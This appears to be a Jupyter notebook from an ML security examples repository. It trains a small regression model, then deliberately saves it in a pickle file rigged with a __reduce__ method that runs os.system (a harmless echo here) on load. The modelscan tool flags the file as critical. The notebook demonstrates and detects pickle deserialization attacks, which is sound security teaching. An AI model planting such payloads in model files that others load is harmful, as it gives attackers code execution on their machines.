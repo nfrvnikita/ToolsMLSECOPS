{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.linear_model import LinearRegression\n",
    "from sklearn.metrics import mean_squared_error\n",
    "import pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Mean Squared Error: 0.6536995137170021\n"
     ]
    }
   ],
   "source": [
    "# Генерация данных\n",
    "np.random.seed(42)\n",
    "X = 2 * np.random.rand(100, 1)\n",
    "y = 4 + 3 * X + np.random.randn(100, 1)\n",
    "\n",
    "# Разделение данных на обучающую и тестовую выборки\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n",
    "\n",
    "# Обучение модели линейной регрессии\n",
    "model = LinearRegression()\n",
    "model.fit(X_train, y_train)\n",
    "\n",
    "# Предсказание на тестовых данных\n",
    "y_pred = model.predict(X_test)\n",
    "\n",
    "# Оценка модели\n",
    "mse = mean_squared_error(y_test, y_pred)\n",
    "print(f\"Mean Squared Error: {mse}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Модель с инъекцией кода сохранена в файл vulnerable_model.pkl\n"
     ]
    }
   ],
   "source": [
    "# Сохранение модели с инъекцией кода в файл с помощью pickle\n",
    "class Exploit:\n",
    "    def __reduce__(self):\n",
    "        import os\n",
    "        return (os.system, (\"echo 'Vulnerable code executed'\",))\n",
    "\n",
    "exploit_model = (model, Exploit())\n",
    "\n",
    "model_filename = 'vulnerable_model.pkl'\n",
    "with open(model_filename, 'wb') as file:\n",
    "    pickle.dump(exploit_model, file)\n",
    "\n",
    "print(f\"Модель с инъекцией кода сохранена в файл {model_filename}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No settings file detected at /home/nfrvnikita/work/mlsecops_examples/mlsecops_examples/Problems_with_Serialization/modelscan-settings.toml. Using defaults. \n",
      "\n",
      "Scanning /home/nfrvnikita/work/mlsecops_examples/mlsecops_examples/Problems_with_Serialization/vulnerable_model.pkl using modelscan.scanners.PickleUnsafeOpScan model scan\n",
      "\n",
      "\u001b[34m--- Summary ---\u001b[0m\n",
      "\n",
      "Total Issues: \u001b[1;36m1\u001b[0m\n",
      "\n",
      "Total Issues By Severity:\n",
      "\n",
      "    - LOW: \u001b[1;32m0\u001b[0m\n",
      "    - MEDIUM: \u001b[1;32m0\u001b[0m\n",
      "    - HIGH: \u001b[1;32m0\u001b[0m\n",
      "    - CRITICAL: \u001b[1;36m1\u001b[0m\n",
      "\n",
      "\u001b[34m--- Issues by Severity ---\u001b[0m\n",
      "\n",
      "\u001b[34m--- CRITICAL ---\u001b[0m\n",
      "\n",
      "Unsafe operator found:\n",
      "  - Severity: CRITICAL\n",
      "  - Description: Use of unsafe operator 'system' from module 'posix'\n",
      "  - Source: /home/nfrvnikita/work/mlsecops_examples/mlsecops_examples/Problems_with_Serialization/vulnerable_model.pkl\n"
     ]
    }
   ],
   "source": [
    "!modelscan -p ./vulnerable_model.pkl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
